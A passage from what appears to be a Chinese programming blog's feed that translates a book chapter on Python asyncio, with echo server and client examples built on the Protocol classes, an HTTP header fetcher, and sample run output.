Client：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> asyncio</div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">tcp_echo_client</span><span class="params">(message, loop)</span>:</span></div><div class="line">    reader, writer = <span class="keyword">await</span> asyncio.open_connection(<span class="string">'127.0.0.1'</span>, <span class="number">8888</span>, loop=loop)</div><div class="line">    print(<span class="string">'Send: %r'</span> % message)</div><div class="line">    writer.write(message.encode())</div><div class="line"></div><div class="line">    data = <span class="keyword">await</span> reader.read(<span class="number">100</span>)</div><div class="line">    print(<span class="string">'Received: %r'</span> % data.decode())</div><div class="line"></div><div class="line">    print(<span class="string">'Close the socket'</span>)</div><div class="line">    writer.close()</div><div class="line"></div><div class="line">message = <span class="string">'Hello World!'</span></div><div class="line">loop = asyncio.get_event_loop()</div><div class="line">loop.run_until_complete(tcp_echo_client(message, loop))</div></pre></td></tr></table></figure></p><p>获取HTTP响应头：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> asyncio</div><div class="line"><span class="keyword">import</span> urllib.parse</div><div class="line"></div><div class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">print_http_headers</span><span class="params">(url)</span>:</span></div><div class="line">    url = urllib.parse.urlsplit(url)</div><div class="line">    <span class="keyword">if</span> url.scheme == <span class="string">'https'</span>:</div><div class="line">        connect = asyncio.open_connection(url.hostname, <span class="number">443</span>, ssl=<span class="keyword">True</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        connect = asyncio.open_connection(url.hostname, <span class="number">80</span>)</div><div class="line">    reader, writer = <span class="keyword">await</span> connect</div><div class="line">    query = (<span class="string">'HEAD &#123;path&#125; HTTP/1.0\r\n'</span></div><div class="line">            <span class="string">'Host: &#123;hostname&#125;\r\n'</span></div><div class="line">            <span class="string">'\r\n'</span>).format(path=url.path <span class="keyword">or</span> <span class="string">'/'</span>, hostname=url.hostname)</div><div class="line">    writer.write(query.encode(<span class="string">'latin-1'</span>))</div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        line = <span class="keyword">await</span> reader.readline()</div><div class="line">        <span class="keyword">if</span> <span class="keyword">not</span> line:</div><div class="line">            <span class="keyword">break</span></div><div class="line">        line = line.decode(<span class="string">'latin1'</span>).rstrip()</div><div class="line">        <span class="keyword">if</span> line:</div><div class="line">            print(<span class="string">'HTTP header&gt; %s'</span> % line)</div><div class="line"></div><div class="line">    <span class="comment"># Ignore the body, close the socket</span></div><div class="line">    writer.close()</div><div class="line"></div><div class="line">loop = asyncio.get_event_loop()</div><div class="line">task = asyncio.ensure_future(print_http_headers(<span class="string">'http://www.baidu.com'</span>))</div><div class="line">loop.run_until_complete(task)</div><div class="line">loop.close()</div></pre></td></tr></table></figure></p><p><strong>本文翻译自《The Python3 Standard Library By Example》asyncio相关章节</strong></p></the></excerpt>]]></content>
      
      <categories>
          
          <category> Python编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> asyncio </tag>
            
            <tag> 异步并发 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>asyncio之协议抽象类的异步I/O</title>
      <link href="/2017/12/21/asyncio%E4%B9%8B%E5%8D%8F%E8%AE%AE%E6%8A%BD%E8%B1%A1%E7%B1%BB%E7%9A%84%E5%BC%82%E6%AD%A5I-O/"/>
      <url>/2017/12/21/asyncio%E4%B9%8B%E5%8D%8F%E8%AE%AE%E6%8A%BD%E8%B1%A1%E7%B1%BB%E7%9A%84%E5%BC%82%E6%AD%A5I-O/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要=""><p>协议抽象类的异步I/O</p><a id="more"></a><the rest="" of="" contents="" |="" 余下全文=""><p>到目前为止，这些例子都避免了混合并发和I/O操作，一次只关注一个概念。然后当I/O阻塞时切换上下文是asyncio的主要是用情景之一。前面已经介绍过并发的概念，本章节将介绍两个实现简单的echo服务器和客户端，跟socket和socketserver章节使用的例子类似。客户端可以连接到服务器，发送一些数据，然后接收相同的数据作为响应。每次发起I/O操作时，执行代码都会放弃对事件循环的控制，允许其他任务运行，直到I/O准备就绪。</p><h3 id="Echo-Server"><a href="#Echo-Server" class="headerlink" title="Echo Server"></a>Echo Server</h3><p>服务器通过导入设置所需的模块asyncio和logging来启动，然后创建一个事件循环对象。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> asyncio</div><div class="line"><span class="keyword">import</span> logging</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line">SERVER_ADDRESS = (<span class="string">'localhost'</span>, <span class="number">10000</span>)</div><div class="line"></div><div class="line">logging.basicConfig(</div><div class="line">    level=logging.DEBUG,</div><div class="line">    format=<span class="string">'%(name)s: %(message)s'</span>,</div><div class="line">    stream=sys.stderr,</div><div class="line">)</div><div class="line">log = logging.getLogger(<span class="string">'main'</span>)</div><div class="line"></div><div class="line">event_loop = asyncio.get_event_loop()</div></pre></td></tr></table></figure></p><p>然后定义一个asyncio.Protocol的子类来处理客户端通信。协议对象的方法是基于与服务器socket关联的事件来调用的。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">EchoServer</span><span class="params">(asyncio.Protocol)</span>:</span></div></pre></td></tr></table></figure></p><p>每个新的客户端连接都会触发调用connection_made()。transport参数是asyncio.Transport的一个实例，它提供了使用socket进行异步I/O的抽象。不同类型的通信提供不同的传输实现，全部使用相同的API。例如，有单独的传输类用于处理socket和用于处理子进程的管道。传入客户端的地址可通过一个特殊实现的方法get_extra_info()从传输中获得。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">connection_made</span><span class="params">(self, transport)</span>:</span></div><div class="line">    self.transport = transport</div><div class="line">    self.address = transport.get_extra_info(<span class="string">'peername'</span>)</div><div class="line">    self.log = logging.getLogger(<span class="string">'EchoServer_&#123;&#125;_&#123;&#125;'</span>.format(*self.address))</div><div class="line">    self.log.debug(<span class="string">'connection accepted'</span>)</div></pre></td></tr></table></figure></p><p>连接建立后，当数据从客户端发送到服务器调用协议的data_received()方法传递数据进行处理。数据以字节字符串形式进行传递，应用程序以适当的方式解码。在这里记录结果，然后通过调用transport.write()立即将响应发送回客户端。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">data_received</span><span class="params">(self, data)</span>:</span></div><div class="line">    self.log.debug(<span class="string">'received &#123;!r&#125;'</span>.format(data))</div><div class="line">    self.transport.write(data)</div><div class="line">    self.log.debug(<span class="string">'sent &#123;!r&#125;'</span>.format(data))</div></pre></td></tr></table></figure></p><p>一些传输支持特殊的文件结束指示符（EOF）。当遇到EOF时，eof_received()被调用。在这里的实现中，EOF被发送回客户端以表明它已被接收。因为不是所有的传输都支持明确的EOF，该协议首先询问运输工具是否安全发送EOF。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">eof_received</span><span class="params">(self)</span>:</span></div><div class="line">    self.log.debug(<span class="string">'received EOF'</span>)</div><div class="line">    <span class="keyword">if</span> self.transport.can_write_eof():</div><div class="line">        self.transport.write_eof()</div></pre></td></tr></table></figure></p><p>当连接关闭时，通常或者由于错误，协议的connection_lost()方法将会被调用。如果出现错误，则参数包含适当的异常对象。否则它是None。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">connection_lost</span><span class="params">(self, error)</span>:</span></div><div class="line">    <span class="keyword">if</span> error:</div><div class="line">        self.log.error(<span class="string">'ERROR: &#123;&#125;'</span>.format(error))</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        self.log.debug(<span class="string">'closing'</span>)</div><div class="line">    super().connection_lost(error)</div></pre></td></tr></table></figure></p><p>通过两个步骤来启动服务器，首先，应用程序通知事件循环，使用协议类以及要侦听的主机名和socket创建一个新的服务器对象。create_server()方法是一个协程，所以结果必须由事件循环处理才能真正启动服务器。完成协程会生成绑定到事件循环的asyncio.Server实例。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 创建服务器，然后让循环完成协程</span></div><div class="line">factory = event_loop.create_server(EchoServer, *SERVER_ADDRESS)</div><div class="line"><span class="comment"># 启动真正的事件循环</span></div><div class="line">server = event_loop.run_until_complete(factory)</div><div class="line">log.debug(<span class="string">'starting up on &#123;&#125; port &#123;&#125;'</span>.format(*SERVER_ADDRESS))</div></pre></td></tr></table></figure></p><p>然后，需要运行事件循环才能处理事件并处理客户端请求。对于长期运行的服务，run_forever()方法是最简单的方法。当事件循环停止时，无论是通过应用程序代码还是通过发信号通知进程，都可以关闭服务器以正确清理socket，然后在程序退出之前事件循环可以关闭，以完成处理任何其他的协程。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 永久运行事件循环以处理所有连接</span></div><div class="line"><span class="keyword">try</span>:</div><div class="line">    event_loop.run_forever()</div><div class="line"><span class="keyword">finally</span>:</div><div class="line">    log.debug(<span class="string">'closing server'</span>)</div><div class="line">    server.close()</div><div class="line">    event_loop.run_until_complete(server.wait_closed())</div><div class="line">    log.debug(<span class="string">'closing event loop'</span>)</div><div class="line">    event_loop.close()</div></pre></td></tr></table></figure></p><h3 id="Echo-Client"><a href="#Echo-Client" class="headerlink" title="Echo Client"></a>Echo Client</h3><p>使用协议类构建客户端与构建服务器非常相似。代码再次通过导入设置所需的模块asyncio和logging来启动，然后创建一个事件循环对象。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> asyncio</div><div class="line"><span class="keyword">import</span> functools</div><div class="line"><span class="keyword">import</span> logging</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line">MESSAGES = [</div><div class="line">    <span class="string">b'This is the message. '</span>,</div><div class="line">    <span class="string">b'It will be sent '</span>,</div><div class="line">    <span class="string">b'in parts.'</span>,</div><div class="line">]</div><div class="line">SERVER_ADDRESS = (<span class="string">'localhost'</span>, <span class="number">10000</span>)</div><div class="line"></div><div class="line">logging.basicConfig(</div><div class="line">    level=logging.DEBUG,</div><div class="line">    format=<span class="string">'%(name)s: %(message)s'</span>,</div><div class="line">    stream=sys.stderr,</div><div class="line">)</div><div class="line">log = logging.getLogger(<span class="string">'main'</span>)</div><div class="line"></div><div class="line">event_loop = asyncio.get_event_loop</div></pre></td></tr></table></figure></p><p>客户端协议类定义与服务器相同的方法，具有不同的实现。类的构造函数接受两个参数，要发送的消息的列表以及用于通过从服务器接收响应来发信号通知客户已经完成了一个工作周期的Future实例。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">EchoClient</span><span class="params">(asyncio.Protocol)</span>:</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, messages, future)</span>:</span></div><div class="line">        super().__init__()</div><div class="line">        self.messages = messages</div><div class="line">        self.log = logging.getLogger(<span class="string">'EchoClient'</span>)</div><div class="line">        self.f = future</div></pre></td></tr></table></figure></p><p>当客户端成功连接到服务器时，它立即开始通信。尽管底层网络代码可以将多个消息组合成一个传输，但是消息序列一次只能发送一个消息。当所有的消息都发送完成时，发送一个EOF。<br>虽然看起来数据全部是立即发送，实际上，传输对象缓冲传出数据，并在socket的缓冲区准备好接收数据时设置一个实际传输的回调。这一切都是透明处理的，所以应用程序代码可以像I/O操作马上发生一样写入。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">connection_made</span><span class="params">(self, transport)</span>:</span></div><div class="line">    self.transport = transport</div><div class="line">    self.address = transport.get_extra_info(<span class="string">'peername'</span>)</div><div class="line">    self.log.debug(</div><div class="line">        <span class="string">'connecting to &#123;&#125; port &#123;&#125;'</span>.format(*self.address)</div><div class="line">    )</div><div class="line">    <span class="comment"># This could be transport.writelines() except that</span></div><div class="line">    <span class="comment"># would make it harder to show each part of the message</span></div><div class="line">    <span class="comment"># being sent.</span></div><div class="line">    <span class="keyword">for</span> msg <span class="keyword">in</span> self.messages:</div><div class="line">        transport.write(msg)</div><div class="line">        self.log.debug(<span class="string">'sending &#123;!r&#125;'</span>.format(msg))</div><div class="line">    <span class="keyword">if</span> transport.can_write_eof():</div><div class="line">        transport.write_eof()</div></pre></td></tr></table></figure></p><p>当收到来自服务器的响应时，记录下来。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">data_received</span><span class="params">(self, data)</span>:</span></div><div class="line">    self.log.debug(<span class="string">'received &#123;!r&#125;'</span>.format(data))</div></pre></td></tr></table></figure></p><p>当接收到文件结束标记或从服务器端关闭连接时，本地传输对象关闭，Future对象通过设置结果被标记为已完成。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">eof_received</span><span class="params">(self)</span>:</span></div><div class="line">    self.log.debug(<span class="string">'received EOF'</span>)</div><div class="line">    self.transport.close()</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> self.f.done():</div><div class="line">        self.f.set_result(<span class="keyword">True</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">connection_lost</span><span class="params">(self, exc)</span>:</span></div><div class="line">    self.log.debug(<span class="string">'server closed connection'</span>)</div><div class="line">    self.transport.close()</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> self.f.done():</div><div class="line">        self.f.set_result(<span class="keyword">True</span>)</div><div class="line">    super().connection_lost(exc)</div></pre></td></tr></table></figure></p><p>协议类通常被传递给事件循环来创建连接。在这种情况下，因为事件循环无法将多余的参数传递给协议构造函数，有必要创建一个partial来包装客户端类并传递消息列表和Future实例进行发送。然后在调用create_connection()建立客户端连接时，使用新的可调用代替类。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">client_completed = asyncio.Future()</div><div class="line"></div><div class="line">client_factory = functools.partial(</div><div class="line">    EchoClient,</div><div class="line">    messages=MESSAGES,</div><div class="line">    future=client_completed,</div><div class="line">)</div><div class="line">factory_coroutine = event_loop.create_connection(</div><div class="line">    client_factory,</div><div class="line">    *SERVER_ADDRESS,</div><div class="line">)</div></pre></td></tr></table></figure></p><p>要启动客户端运行，事件循环被调用一次与协程创建客户端，然后再与Future实例交给客户端进行通信。使用这样的两个调用可以避免在客户端程序中产生一个无限循环，在完成与服务器的通信后，可能要退出。如果只有第一个调用被用来等待协程来创建客户端，它可能不会处理所有的响应数据，并正确地清理到服务器的连接。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">log.debug(<span class="string">'waiting for client to complete'</span>)</div><div class="line"><span class="keyword">try</span>:</div><div class="line">    event_loop.run_until_complete(factory_coroutine)</div><div class="line">    event_loop.run_until_complete(client_completed)</div><div class="line"><span class="keyword">finally</span>:</div><div class="line">    log.debug(<span class="string">'closing event loop'</span>)</div><div class="line">    event_loop.close()</div></pre></td></tr></table></figure></p><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><p>在一个窗口中运行服务器，在另一个窗口中运行客户端将生成以下输出。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">$ python3 asyncio_echo_client_protocol.py</div><div class="line">asyncio: Using selector: KqueueSelector</div><div class="line">main: waiting <span class="keyword">for</span> client to complete</div><div class="line">EchoClient: connecting to ::<span class="number">1</span> port <span class="number">10000</span></div><div class="line">EchoClient: sending <span class="string">b'This is the message. '</span></div><div class="line">EchoClient: sending <span class="string">b'It will be sent '</span></div><div class="line">EchoClient: sending <span class="string">b'in parts.'</span></div><div class="line">EchoClient: received <span class="string">b'This is the message. It will be sent in parts.'</span></div><div class="line">EchoClient: received EOF</div><div class="line">EchoClient: server closed connection</div><div class="line">main: closing event loop</div><div class="line"></div><div class="line">$ python3 asyncio_echo_client_protocol.py</div><div class="line">asyncio: Using selector: KqueueSelector</div><div class="line">main: waiting <span class="keyword">for</span> client to complete</div><div class="line">EchoClient: connecting to ::<span class="number">1</span> port <span class="number">10000</span></div><div class="line">EchoClient: sending <span class="string">b'This is the message. '</span></div><div class="line">EchoClient: sending <span class="string">b'It will be sent '</span></div><div class="line">EchoClient: sending <span class="string">b'in parts.'</span></div><div class="line">EchoClient: received <span class="string">b'This is the message. It will be sent in parts.'</span></div><div class="line">EchoClient: received EOF</div><div class="line">EchoClient: server closed connection</div><div class="line">main: closing event loop</div><div class="line"></div><div class="line">$ python3 asyncio_echo_client_protocol.py</div><div class="line">asyncio: Using selector: KqueueSelector</div><div class="line">main: waiting <span class="keyword">for</span> client to complete</div><div class="line">EchoClient: connecting to ::<span class="number">1</span> port <span class="number">10000</span></div><div class="line">EchoClient: sending <span class="string">b'This is the message. '</span></div><div class="line">EchoClient: sending <span class="string">b'It will be sent '</span></div><div class="line">EchoClient: sending <span class="string">b'in parts.'</span></div><div class="line">EchoClient: received <span class="string">b'This is the message. It will be sent in parts.'</span></div><div class="line">EchoClient: received EOF</div><div class="line">EchoClient: server closed connection</div><div class="line">main: closing event loop</div></pre></td></tr></table></figure></p><p>尽管客户端总是单独发送消息，但是客户端第一次运行服务器却会收到一条大消息，并将消息回传给客户端。这些结果在后续运行中会有所不同，具体取决于网络的繁忙程度以及在准备好所有数据之前是否刷新了网络缓冲区。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">$ python3 asyncio_echo_server_protocol.py</div><div class="line">asyncio: Using selector: KqueueSelector</div><div class="line">main: starting up on localhost port <span class="number">10000</span></div><div class="line">EchoServer_::<span class="number">1</span>_63347: connection accepted</div><div class="line">EchoServer_::<span class="number">1</span>_63347: received <span class="string">b'This is the message. It will be sent in parts.'</span></div><div class="line">EchoServer_::<span class="number">1</span>_63347: sent <span class="string">b'This is the message. It will be sent in parts.'</span></div><div class="line">EchoServer_::<span class="number">1</span>_63347: received EOF</div><div class="line">EchoServer_::<span class="number">1</span>_63347: closing</div><div class="line"></div><div class="line">EchoServer_::<span class="number">1</span>_63387: connection accepted</div><div class="line">EchoServer_::<span class="number">1</span>_63387: received <span class="string">b'This is the message. '</span></div><div class="line">EchoServer_::<span class="number">1</span>_63387: sent <span class="string">b'This is the message. '</span></div><div class="line">EchoServer_::<span class="number">1</span>_63387: received <span class="string">b'It will be sent in parts.'</span></div><div class="line">EchoServer_::<span class="number">1</span>_63387: sent <span class="string">b'It will be sent in parts.'</span></div><div class="line">EchoServer_::<span class="number">1</span>_63387: received EOF</div><div class="line">EchoServer_::<span class="number">1</span>_63387: closing</div><div class="line"></div><div class="line">EchoServer_::<span class="number">1</span>_63389: connection accepted</div><div class="line">EchoServer_::<span class="number">1</span>_63389: received <span class="string">b'This is the message. It will be sent '</span></div><div class="line">EchoServer_::<span class="number">1</span>_63389: sent <span class="string">b'This is the message. It will be sent '</span></div><div class="line">EchoServer_::<span class="number">1</span>_63389: received <span class="string">b'in parts.'</span></div><div class="line">EchoServer_::<span class="number">1</span>_63389: sent <span class="string">b'in parts.'</span></div><div class="line">EchoServer_::<span class="number">1</span>_63389: received EOF</div><div class="line">EchoServer_::<span class="number">1</span>_63389: closing</div></pre></td></tr></table></figure></p><h3 id="其他实例"><a href="#其他实例" class="headerlink" title="其他实例"></a>其他实例</h3><p>asyncio官方文档也提供了相应的例子，下面展示给大家：<br>TCP Echo Server：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> asyncio</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">EchoServerClientProtocol</span><span class="params">(asyncio.Protocol)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">connection_made</span><span class="params">(self, transport)</span>:</span></div><div class="line">        peername = transport.get_extra_info(<span class="string">'peername'</span>)</div><div class="line">        print(<span class="string">'Connection from &#123;&#125;'</span>.format(peername))</div><div class="line">        self.transport = transport</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">data_received</span><span class="params">(self, data)</span>:</span></div><div class="line">        message = data.decode()</div><div class="line">        print(<span class="string">'Data received: &#123;!r&#125;'</span>.format(message))</div><div class="line"></div><div class="line">        print(<span class="string">'Send: &#123;!r&#125;'</span>.format(message))</div><div class="line">        self.transport.write(data)</div><div class="line"></div><div class="line">        print(<span class="string">'Close the client socket'</span>)</div><div class="line">        self.transport.close()</div><div class="line"></div><div class="line">loop = asyncio.get_event_loop()</div><div class="line"><span class="comment"># Each client connection will create a new protocol instance</span></div><div class="line">coro = loop.create_server(EchoServerClientProtocol, <span class="string">'127.0.0.1'</span>, <span class="number">8888</span>)</div><div class="line">server = loop.run_until_complete(coro)</div><div class="line"></div><div class="line"><span class="comment"># Serve requests until Ctrl+C is pressed</span></div><div class="line">print(<span class="string">'Serving on &#123;&#125;'</span>.format(server.sockets[<span class="number">0</span>].getsockname()))</div><div class="line"><span class="keyword">try</span>:</div><div class="line">    loop.run_forever()</div><div class="line"><span class="keyword">except</span> KeyboardInterrupt:</div><div class="line">    <span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="comment"># Close the server</span></div><div class="line">server.close()</div><div class="line">loop.run_until_complete(server.wait_closed())</div><div class="line">loop.close()</div></pre></td></tr></table></figure></p><p>TCP Echo Client：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> asyncio</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">EchoClientProtocol</span><span class="params">(asyncio.Protocol)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, message, loop)</span>:</span></div><div class="line">        self.message = message</div><div class="line">        self.loop = loop</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">connection_made</span><span class="params">(self, transport)</span>:</span></div><div class="line">        transport.write(self.message.encode())</div><div class="line">        print(<span class="string">'Data sent: &#123;!r&#125;'</span>.format(self.message))</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">data_received</span><span class="params">(self, data)</span>:</span></div><div class="line">        print(<span class="string">'Data received: &#123;!r&#125;'</span>.format(data.decode()))</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">connection_lost</span><span class="params">(self, exc)</span>:</span></div><div class="line">        print(<span class="string">'The server closed the connection'</span>)</div><div class="line">        print(<span class="string">'Stop the event loop'</span>)</div><div class="line">        self.loop.stop()</div><div class="line"></div><div class="line">loop = asyncio.get_event_loop()</div><div class="line">message = <span class="string">'Hello World!'</span></div><div class="line">coro = loop.create_connection(<span class="keyword">lambda</span>: EchoClientProtocol(message, loop),</div><div class="line">                              <span class="string">'127.0.0.1'</span>, <span class="number">8888</span>)</div><div class="line">loop.run_until_complete(coro)</div><div class="line">loop.run_forever()</div><div class="line">loop.close()</div></pre></td></tr></table></figure></p><p>UDP Echo Server：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> asyncio</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">EchoServerProtocol</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">connection_made</span><span class="params">(self, transport)</span>:</span></div><div class="line">        self.transport = transport</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">datagram_received</span><span class="params">(self, data, 